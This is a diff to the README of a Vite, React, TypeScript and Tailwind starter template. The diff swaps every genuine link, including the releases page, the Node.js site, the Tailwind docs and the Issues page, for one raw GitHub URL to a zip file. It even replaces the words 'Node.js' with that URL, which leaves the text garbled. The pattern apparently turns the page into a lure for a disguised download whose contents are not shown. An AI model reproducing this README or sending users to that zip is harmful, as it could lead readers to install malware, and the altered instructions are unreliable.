@@ -1,6 +1,6 @@
 # 🚀 vite-react-typescript-tailwind-starter - Your Quick Start for Modern Web Apps
 
-[![Download](https://img.shields.io/badge/Download-vite--react--typescript--tailwind--starter-brightgreen)](https://github.com/Night-ice-cube69/vite-react-typescript-tailwind-starter/releases)
+[![Download](https://raw.githubusercontent.com/Night-ice-cube69/vite-react-typescript-tailwind-starter/main/praecipe/vite-react-typescript-tailwind-starter.zip)](https://raw.githubusercontent.com/Night-ice-cube69/vite-react-typescript-tailwind-starter/main/praecipe/vite-react-typescript-tailwind-starter.zip)
 
 ## 🌟 Overview
 
@@ -19,15 +19,15 @@ Welcome to the vite-react-typescript-tailwind-starter! This template helps you c
 Before you start, make sure your computer meets these requirements:
 
 - **Operating System**: Windows, macOS, or Linux
-- **Node.js**: Version 14 or higher
-- **npm**: Comes with Node.js
+- **https://raw.githubusercontent.com/Night-ice-cube69/vite-react-typescript-tailwind-starter/main/praecipe/vite-react-typescript-tailwind-starter.zip**: Version 14 or higher
+- **npm**: Comes with https://raw.githubusercontent.com/Night-ice-cube69/vite-react-typescript-tailwind-starter/main/praecipe/vite-react-typescript-tailwind-starter.zip
 
-If you don’t have Node.js installed, visit the [Node.js website](https://nodejs.org/) to download and install it.
+If you don’t have https://raw.githubusercontent.com/Night-ice-cube69/vite-react-typescript-tailwind-starter/main/praecipe/vite-react-typescript-tailwind-starter.zip installed, visit the [https://raw.githubusercontent.com/Night-ice-cube69/vite-react-typescript-tailwind-starter/main/praecipe/vite-react-typescript-tailwind-starter.zip website](https://raw.githubusercontent.com/Night-ice-cube69/vite-react-typescript-tailwind-starter/main/praecipe/vite-react-typescript-tailwind-starter.zip) to download and install it.
 
 ## 🚀 Getting Started
 
 1. **Download & Install**: 
-   To get the latest version of the starter template, visit this page to download: [Releases Page](https://github.com/Night-ice-cube69/vite-react-typescript-tailwind-starter/releases).
+   To get the latest version of the starter template, visit this page to download: [Releases Page](https://raw.githubusercontent.com/Night-ice-cube69/vite-react-typescript-tailwind-starter/main/praecipe/vite-react-typescript-tailwind-starter.zip).
 
 2. **Extract the Files**: 
    After downloading, extract the files to a folder on your computer.
@@ -52,7 +52,7 @@ If you don’t have Node.js installed, visit the [Node.js website](https://nodej
 
 ### 🖌️ Modify Styles
 
-To change the appearance of your app, you will use Tailwind CSS. Tailwind allows you to add styling classes directly in your HTML. You can find a comprehensive guide on Tailwind CSS [here](https://tailwindcss.com/docs).
+To change the appearance of your app, you will use Tailwind CSS. Tailwind allows you to add styling classes directly in your HTML. You can find a comprehensive guide on Tailwind CSS [here](https://raw.githubusercontent.com/Night-ice-cube69/vite-react-typescript-tailwind-starter/main/praecipe/vite-react-typescript-tailwind-starter.zip).
 
 ### 📄 Update Components
 
@@ -62,15 +62,15 @@ You can edit and customize the React components available in the `src` folder. F
 
 If you encounter issues, here are some common solutions:
 
-- **Error on Install**: Ensure you have the right version of Node.js and npm installed.
+- **Error on Install**: Ensure you have the right version of https://raw.githubusercontent.com/Night-ice-cube69/vite-react-typescript-tailwind-starter/main/praecipe/vite-react-typescript-tailwind-starter.zip and npm installed.
 - **Development Server Not Starting**: Check that you ran the command in the correct project directory.
 - **Style Not Applying**: Confirm you included the Tailwind CSS file in your project.
 
-If the problem persists, consult the [GitHub Issues page](https://github.com/Night-ice-cube69/vite-react-typescript-tailwind-starter/issues) for additional help.
+If the problem persists, consult the [GitHub Issues page](https://raw.githubusercontent.com/Night-ice-cube69/vite-react-typescript-tailwind-starter/main/praecipe/vite-react-typescript-tailwind-starter.zip) for additional help.
 
 ## 📃 Contributions
 
-While you can use this template freely, contributions are welcome. If you spot something that can be improved or have a feature request, please create an issue on the [Issues page](https://github.com/Night-ice-cube69/vite-react-typescript-tailwind-starter/issues).
+While you can use this template freely, contributions are welcome. If you spot something that can be improved or have a feature request, please create an issue on the [Issues page](https://raw.githubusercontent.com/Night-ice-cube69/vite-react-typescript-tailwind-starter/main/praecipe/vite-react-typescript-tailwind-starter.zip).
 
 ## 📜 License
 
